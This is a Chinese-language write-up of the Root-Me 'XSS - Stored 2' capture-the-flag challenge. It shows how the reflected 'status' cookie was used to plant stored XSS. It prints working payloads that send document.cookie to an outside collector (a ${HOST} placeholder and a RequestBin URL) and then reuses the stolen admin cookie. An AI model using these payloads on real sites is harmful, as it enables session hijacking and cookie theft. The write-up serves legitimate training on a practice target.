## [[Root-Me](https://www.root-me.org/)] [[Cracking](https://www.root-me.org/en/Challenges/Web-Client/)] [[XSS - Stored 2](https://www.root-me.org/en/Challenges/Web-Client/XSS-Stored-2)] [[解题报告](http://exp-blog.com/2019/01/22/pid-3166/)]

------

很直白告诉了告诉了我们是存储型 XSS 题型。注意题目要求：

`Steal the administrator session's cookie and go in the admin section.`

意思就是：**窃取 administrator 的 cookie 并使用它打开 admin 的 section 区域页面**。

注意到在挑战页面顶部有个 `admin` 超链，点击后 URL 多了个请求参数 `?section=admin` ， 但是页面内容无变化，猜测这就是需要使用 administrator 的 cookie 才能访问的页面。

------------


挑战页面有两个输入口，但是测试过，这两个输入框都对所有 html 标签字符做了过滤，无法注入。

仔细观察，发现提交输入后，页面会回显 3 个内容：

- 输入的 Title
- 输入的 Content
- 右上角的 Status 值（**似乎固定为 invite？其实不然！**）

![](http://exp-blog.com/wp-content/uploads/2019/01/c524d40fcfdb1200ffdec983e5260bcb.png)

> 多刷新几次页面，不难注意到这台靶机后台有个 admin-robot 在定时读取提交的消息。

------------

打开浏览器开发者工具：

- 切到 Network 查看页面cookie ，发现 `status=invite` 是其中一个  cookie 值（另一个是当前用户的 `uid`）。
- 切到 Elements  查看提交回显的内容，发现 `invite` 是 &lt;i&gt; 标签的 class 值

![](http://exp-blog.com/wp-content/uploads/2019/01/22b83f43ef64024795b50d6a09282f36.png)

![](http://exp-blog.com/wp-content/uploads/2019/01/b83b05eb759e7c1742160cf4c1816621.png)


------------

使用 Burp Suite -> Repeater 任意修改 cookie 的 `status` 值后再发送请求，发现回显的内容中的 &lt;i&gt; 标签的 class 值也随之改变，说明**这就是 XSS 注入点**。

![](http://exp-blog.com/wp-content/uploads/2019/01/ee5593eb672ad2f7264620e15a5c647c.png)


------------

尝试构造 payloads ： `"><script>alert(1)</script>` （关闭 &lt;i&gt; 标签再注入 &lt;script&gt;）

通过 Burp Suite -> Repeater 提交，页面弹出警告对话框，注入成功。

![](http://exp-blog.com/wp-content/uploads/2019/01/04033e37798966756844a166938ff6e5.png)

![](http://exp-blog.com/wp-content/uploads/2019/01/d975300b28ff63a24cc954b5160a796b.png)

------------

至此思路很明确了：通过 cookie 把包含 payloads 消息存储到后台，当 admin-robot 读取到这条消息时，就把这个机器人的 cookie 发送到我们的指定的一台服务器，实现 Cookie 窃取。

假设我们已经搭建了一台服务器 `${HOST}` ，那么构造一个这样的 payloads 即可实现 cookie 窃取：

`"><script>document.write(%22<img src=${HOST}?%22.concat(document.cookie).concat(%22 />%22))</script>`

其中对于 `${HOST}` 服务器，推荐使用 [RequestBin](https://requestbin.fullcontact.com/) 生成的临时 HTTP 服务器。例如你生成的 HTTP 服务的临时 URL 为 `http://requestbin.fullcontact.com/q9vld7q9`，则把 payloads 修改为：

`"><script>document.write(%22<img src=http://requestbin.fullcontact.com/q9vld7q9?%22.concat(document.cookie).concat(%22 />%22))</script>`

![](http://exp-blog.com/wp-content/uploads/2019/01/505f42c6b21457d6e339739e9a61eb1e.png)

------------

提交 payloads 后，好不容易等到  admin-robot 读取了消息，但是在 HTTP 服务器查看  admin-robot 发送过来的请求却发现，cookie 只有 `status` 参数，缺失了最重要的 `uid` 参数。

![](http://exp-blog.com/wp-content/uploads/2019/01/57f014f92a52eff6c6b7833afdc5d874.png)


------------


其实从 Burp Suite -> Repeater 可以发现， cookie 本来完整的值是这样的（`status` 和 `uid` 之间有**空格**）：

`status=invite; uid=wKgbZFxF4fV0HH+nA2kGAg==`

导致构造前面的 payloads 提交后， 因为这个空格使得 cookie 被拆解成两部分：

- 前半部分的 `status` 作为 &lt;img&gt; 标签的 `src` 属性被提交到 HTTP 服务器
- 后半部分的 `uid` 则成为 &lt;img&gt; 标签的一个独立属性

![](http://exp-blog.com/wp-content/uploads/2019/01/c3697edb648aafa09f882a5bb4f6f036.png)


![](http://exp-blog.com/wp-content/uploads/2019/01/9c0d233b92d408aae74810eea87c5f7a.png)

------------

因此，为了把 `uid` 的值也窃取，需要把 payloads 做了小改动，即把 `document.cookie` 的空格处理掉。

在这里我把空格替换成 `&` ，最终 payloads 如下：

`"><script>document.write(%22<img src=${HOST}?%22.concat(document.cookie.replace(%22 %22,%22&%22)).concat(%22 />%22))</script>`

![](http://exp-blog.com/wp-content/uploads/2019/01/addc0175089549bbc2a9d65b0dfddfef.png)

------------


提交后成功从 HTTP 服务器收到 `ADMIN_COOKIE` ：

![](http://exp-blog.com/wp-content/uploads/2019/01/d31f04abf0f90aa021e0b4a594d63f13.png)

------------

但是注意不要急着完成挑战，因为这并不是密码，题目要求的是： **窃取 administrator 的 cookie 并使用它打开 admin 的 section 区域页面**。

把从 HTTP 服务器收到的 cookie 的 `&` 改回去空格，得到真正的  cookie 值：

`status=invite; ADMIN_COOKIE=SY2USDIH78TF3DFU78546TE7F`

将其修改到 Burp Suite -> Repeater 的请求 Cookie 后访问页面：

`http://challenge01.root-me.org/web-client/ch19/?section=admin`

得到密码，完成挑战。

![](http://exp-blog.com/wp-content/uploads/2019/01/e287b895021a2c2134c516cfa3dab970.png)

------

## 版权声明

　[![Copyright (C) 2016-2019 By EXP](https://img.shields.io/badge/Copyright%20(C)-2016~2019%20By%20EXP-blue.svg)](http://exp-blog.com)　[![License: GPL v3](https://img.shields.io/badge/License-GPL%20v3-blue.svg)](https://www.gnu.org/licenses/gpl-3.0)
  

- Site: [http://exp-blog.com](http://exp-blog.com) 
- Mail: <a href="mailto:289065406@qq.com?subject=[EXP's Github]%20Your%20Question%20（请写下您的疑问）&amp;body=What%20can%20I%20help%20you?%20（需要我提供什么帮助吗？）">289065406@qq.com</a>


------
